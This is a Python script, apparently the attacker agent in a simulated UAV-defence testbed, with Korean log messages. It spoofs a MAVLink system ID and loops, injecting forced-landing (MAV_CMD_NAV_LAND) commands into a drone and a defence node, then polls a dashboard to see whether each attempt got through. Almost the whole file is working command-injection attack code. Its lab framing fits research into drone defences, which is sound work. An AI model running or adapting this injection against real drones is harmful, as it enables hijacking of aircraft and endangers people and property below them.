import json
import os
import socket
import time
from pymavlink import mavutil

TARGET_HOST     = '172.20.0.10'
DEFENSE_HOST    = '172.20.0.60'
TARGET_PORT     = 14551
SYS_ID          = 1
ATTACKER_SYS_ID = 99

DASHBOARD_HOST = os.getenv("DASHBOARD_HOST", "dah-dashboard")
DASHBOARD_PORT = int(os.getenv("DASHBOARD_PORT", "14571"))

_evt_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def _send(source, message, level="warn", detail="", status=""):
    evt = {
        "platform_type": "AGENT",
        "agent_type":    "ATK",
        "platform_id":   "ATK-EXEC",
        "source":        source,
        "message":       message,
        "detail":        detail,
        "level":         level,
        "status":        status,
        "time":          time.strftime("%H:%M:%S"),
    }
    try:
        _evt_sock.sendto(json.dumps(evt).encode(), (DASHBOARD_HOST, DASHBOARD_PORT))
    except Exception:
        pass


DASHBOARD_URL = f"http://{DASHBOARD_HOST}:8080"


def check_uav_flying():
    """UAV가 여전히 비행 중이면 True (방어에 막힌 것)"""
    try:
        import urllib.request
        with urllib.request.urlopen(f"{DASHBOARD_URL}/api/live", timeout=1.5) as r:
            data = json.loads(r.read())
        platforms = {p["platform_id"]: p for p in data.get("platforms", [])}
        uav = platforms.get("UAV-001")
        return uav is not None and uav.get("alt", 0) > 500
    except Exception:
        return None  # 확인 불가


def inject_land(mav, host):
    mav.mav.command_long_send(
        target_system=SYS_ID,
        target_component=1,
        command=mavutil.mavlink.MAV_CMD_NAV_LAND,
        confirmation=0,
        param1=0, param2=0, param3=0, param4=0,
        param5=0, param6=0, param7=0,
    )
    print(f"[EXECUTOR] ⚠️  LAND 명령 주입 완료 → SYS_ID={SYS_ID} | {host}:{TARGET_PORT}")
    _send("EXECUTOR",
          "LAND 명령 주입",
          detail=f"위장 SYS_ID={ATTACKER_SYS_ID} → UAV SYS_ID={SYS_ID} ({host}:{TARGET_PORT})",
          status="INJECTED")


def main():
    print(f"[EXECUTOR] 공격 에이전트 시작")
    _send("EXECUTOR", "공격 에이전트 시작",
          level="info",
          detail=f"타깃={TARGET_HOST}:{TARGET_PORT} 위장SYS={ATTACKER_SYS_ID}")

    mav_uav = mavutil.mavlink_connection(
        f'udpout:{TARGET_HOST}:{TARGET_PORT}',
        source_system=ATTACKER_SYS_ID,
    )
    mav_def = mavutil.mavlink_connection(
        f'udpout:{DEFENSE_HOST}:{TARGET_PORT}',
        source_system=ATTACKER_SYS_ID,
    )

    print(f"[EXECUTOR] UAV 준비 대기 중...")
    time.sleep(3)

    count = 1
    while True:
        print(f"[EXECUTOR] 공격 {count}회차 시도")
        _send("EXECUTOR",
              f"공격 {count}회차 시도",
              detail=f"COMMAND_LONG MAV_CMD_NAV_LAND → {TARGET_HOST}:{TARGET_PORT}")
        inject_land(mav_uav, TARGET_HOST)
        inject_land(mav_def, DEFENSE_HOST)

        # 2초 후 UAV 상태 확인 → 공격 성공/실패 판단
        time.sleep(2)
        flying = check_uav_flying()
        if flying is True:
            print(f"[EXECUTOR] ✘ 공격 {count}회차 실패 — 방어에 차단됨")
            _send("EXECUTOR",
                  f"공격 {count}회차 실패 — 방어에 차단됨",
                  level="warn",
                  detail="UAV 고도 유지 중 → RTL 역명령으로 차단된 것으로 추정",
                  status="FAILED")
        elif flying is False:
            print(f"[EXECUTOR] ✔ 공격 {count}회차 성공 — UAV 착륙 중")
            _send("EXECUTOR",
                  f"공격 {count}회차 성공 — UAV 착륙 중",
                  level="warn",
                  detail="UAV 고도 500m 이하 — LAND 명령 실행 중",
                  status="INJECTED")

        count += 1
        time.sleep(1)


if __name__ == '__main__':
    main()
